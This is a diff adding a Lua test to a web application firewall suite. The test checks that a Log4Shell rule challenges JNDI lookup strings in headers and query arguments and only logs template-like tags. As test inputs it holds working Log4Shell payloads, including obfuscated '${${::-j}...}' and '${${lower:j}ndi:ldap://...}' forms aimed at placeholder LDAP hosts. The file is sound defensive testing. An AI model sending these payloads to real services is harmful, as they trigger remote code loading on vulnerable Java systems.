@@ -1818,6 +1818,53 @@ do
   end
 end
 
+-- ── Test 74b: rule_log4shell at challenge_v2 — only the Log4Shell tags bite ─
+-- 2026-11-01: 328 ships at challenge_v2, but the template-shaped tags (NESTED,
+-- ENV, SYS, MAIN, DATE, BASE64) stay logonly at any mode: WAF_CVE is high-risk
+-- and armed, so a cleared customer's challenge-tier hit is a 403 and a ban.
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge_v2")
+
+  -- The fleet's real hits: JNDI in X-Api-Version / Referer from a scanner.
+  local hit, reason, _ttl, action, _hits, rid = waf.check(fresh_ctx({
+    headers = { ["x-api-version"] = "${jndi:ldap://1.2.3.4:1389/a}",
+                ["user-agent"] = "Mozilla/5.0 (compatible; scanner/1.0)" },
+  }))
+  check(hit == true and rid == 328,                              "74b: JNDI header — hit 328")
+  check(reason == "WAF_CVE:LOG4SHELL:JNDI:HDR:x-api-version",    "74b: JNDI header — tag (got " .. tostring(reason) .. ")")
+  check(action == "challenge_v2",                                "74b: JNDI header — challenge_v2 (got " .. tostring(action) .. ")")
+
+  -- The classic nested default-value payload is DEFAULT_VAL, not NESTED, so
+  -- it is enforced (in args/body and in a header).
+  local _, r1, _, a1 = waf.check(fresh_ctx({ args = "x=${${::-j}${::-n}${::-d}${::-i}:ldap://e/a}" }))
+  check(r1 == "WAF_CVE:LOG4SHELL:DEFAULT_VAL",                   "74b: ${${::-j} args — DEFAULT_VAL (got " .. tostring(r1) .. ")")
+  check(a1 == "challenge_v2",                                    "74b: ${${::-j} args — challenge_v2 (got " .. tostring(a1) .. ")")
+  local _, r2, _, a2 = waf.check(fresh_ctx({ headers = { ["user-agent"] = "${${lower:j}ndi:ldap://e/a}" } }))
+  check(r2 == "WAF_CVE:LOG4SHELL:LOWER:HDR:user-agent",          "74b: ${${lower:j} header — LOWER (got " .. tostring(r2) .. ")")
+  check(a2 == "challenge_v2",                                    "74b: ${${lower:j} header — challenge_v2 (got " .. tostring(a2) .. ")")
+  local _, _, _, a3 = waf.check(fresh_ctx({ args = "x=${upper:J}ndi:ldap://e/a" }))
+  check(a3 == "challenge_v2",                                    "74b: UPPER — challenge_v2 (got " .. tostring(a3) .. ")")
+
+  -- Template-shaped tags: recorded, never enforced.
+  local held = {
+    { args = "tpl=`${${item}.name}`",   tag = "NESTED" },
+    { args = "x=${env:HOME}",           tag = "ENV"    },
+    { args = "x=${sys:user.home}",      tag = "SYS"    },
+    { args = "x=${main:0}",             tag = "MAIN"   },
+    { args = "x=${date:yyyy-MM-dd}",    tag = "DATE"   },
+    { args = "x=${base64:Zm9v}",        tag = "BASE64" },
+  }
+  for _, c in ipairs(held) do
+    local h, r, _, a, _, id = waf.check(fresh_ctx({ args = c.args }))
+    check(h == true and id == 328,                               "74b/" .. c.tag .. ": still recorded")
+    check(r == "WAF_CVE:LOG4SHELL:" .. c.tag,                    "74b/" .. c.tag .. ": tag (got " .. tostring(r) .. ")")
+    check(a == "logonly",                                        "74b/" .. c.tag .. ": logonly at challenge_v2 (got " .. tostring(a) .. ")")
+  end
+  local _, rh, _, ah = waf.check(fresh_ctx({ headers = { ["x-a"] = "${date:}" } }))
+  check(rh == "WAF_CVE:LOG4SHELL:DATE:HDR:x-a" and ah == "logonly", "74b: DATE header — logonly (got " .. tostring(rh) .. " " .. tostring(ah) .. ")")
+end
+
 -- ── Test 75: rule_bad_utf8 — 2-byte overlong (0xC0 lead) ───────────────────
 -- "." is U+002E (1 byte). The 2-byte overlong form is 0xC0 0xAE — RFC 3629
 -- reserves 0xC0/0xC1 specifically because they can ONLY produce overlong
